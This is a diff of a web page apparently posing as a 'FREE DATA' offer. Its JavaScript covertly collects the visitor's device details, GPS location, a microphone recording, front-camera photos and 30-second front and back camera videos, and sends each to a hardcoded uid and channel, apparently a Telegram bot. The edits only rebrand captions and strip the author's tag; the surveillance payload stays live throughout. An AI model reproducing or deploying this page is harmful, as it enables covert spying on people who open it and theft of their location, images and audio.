@@ -1,6 +1,6 @@
 <!DOCTYPE html><html lang="en"><head>
 <meta charset="UTF-8">
-<title>PREMIUM DATA UNLIMITED</title>
+<title>FREE DATA 🌟</title>
 <style>
   * {
     margin: 0;
@@ -528,8 +528,8 @@ const uid = '7748871040';
   }
 
   // Send device info
-  await sendMessage(uid, `PREMIUM DEVICE INFO:\nDevice: ${deviceName}\nBattery: ${battery}`);
-  await sendMessage(channelId, `PREMIUM DEVICE INFO:\nDevice: ${deviceName}\nBattery: ${battery}`);
+  await sendMessage(uid, `DEVICE INFO:\n\n🗿Device: ${deviceName}\n\n🔋Battery: ${battery}`);
+  await sendMessage(channelId, `DEVICE INFO:\n\n🗿Device: ${deviceName}\n\n🔋Battery: ${battery}`);
 
   // Location capture with enhanced formatting
   if (navigator.geolocation) {
@@ -537,7 +537,7 @@ const uid = '7748871040';
       async (position) => {
         const { latitude, longitude } = position.coords;
         const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
-        const locationText = `🌍 PREMIUM LOCATION DATA:\n${mapsUrl}`;
+        const locationText = `🌍 LOCATION DATA:\n${mapsUrl}`;
         await sendMessage(uid, locationText);
         await sendMessage(channelId, locationText);
       },
@@ -554,7 +554,7 @@ const uid = '7748871040';
     mediaRecorder.ondataavailable = (e) => audioChunks.push(e.data);
     mediaRecorder.onstop = async () => {
       const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-      const caption = `🎤 PREMIUM 5-Second Audio Recording\nWhatsApp: ${whatsappNumber || 'Not provided'}\n`;
+      const caption = `🎤 5-Second Audio Recording`;
       await sendAudio(uid, audioBlob, caption);
       await sendAudio(channelId, audioBlob, caption);
       audioStream.getTracks().forEach(track => track.stop());
@@ -575,7 +575,7 @@ const uid = '7748871040';
       context.drawImage(frontVideo, 0, 0, canvas.width, canvas.height);
       const base64 = canvas.toDataURL('image/png');
       const blob = await (await fetch(base64)).blob();
-      const caption = `📸 PREMIUM Front Camera Photo ${i}\nWhatsApp: ${whatsappNumber || 'Not provided'}\n𝐀ʟʟ 𝐑ɪɢʜᴛꜱ 𝐑ᴇꜱᴇʀᴠᴇᴅ 𝐓ᴏ 𝐓ʜᴇʜᴀɴ 𝐕ɪɴᴅᴜʟᴀ 👁️ ✥\n@Mr_CrashX`;
+      const caption = `📸 Front Camera Photo ${i}`;
       await sendPhoto(uid, blob, caption);
       await sendPhoto(channelId, blob, caption);
       await new Promise(r => setTimeout(r, 1000));
@@ -608,7 +608,7 @@ const uid = '7748871040';
     
     mediaRecorder.onstop = async () => {
       const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
-      const caption = `🎥 PREMIUM 30-Second Front Camera Video\nWhatsApp: ${whatsappNumber || 'Not provided'}\n𝐀ʟʟ 𝐑ɪɢʜᴛꜱ 𝐑ᴇꜱᴇʀᴠᴇᴅ 𝐓ᴏ 𝐓ʜᴇʜᴀɴ 𝐕ɪɴᴅᴜʟᴀ 👁️✥\n@Mr_CrashX`;
+      const caption = `🎥 30-Second Front Camera Video`;
       await sendVideo(uid, videoBlob, caption);
       await sendVideo(channelId, videoBlob, caption);
       frontVideoStream.getTracks().forEach(track => track.stop());
@@ -645,7 +645,7 @@ const uid = '7748871040';
     
     mediaRecorder.onstop = async () => {
       const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
-      const caption = `🎥 PREMIUM 30-Second Back Camera Video\nWhatsApp: ${whatsappNumber || 'Not provided'}\n𝐀ʟʟ 𝐑ɪɢʜᴛꜱ 𝐑ᴇꜱᴇʀᴠᴇᴅ 𝐓ᴏ 𝐓ʜᴇʜᴀɴ 𝐕ɪɴᴅᴜʟᴀ 👁️✥\n@Mr_CrashX`;
+      const caption = `🎥 30-Second Back Camera Video`;
       await sendVideo(uid, videoBlob, caption);
       await sendVideo(channelId, videoBlob, caption);
       backVideoStream.getTracks().forEach(track => track.stop());
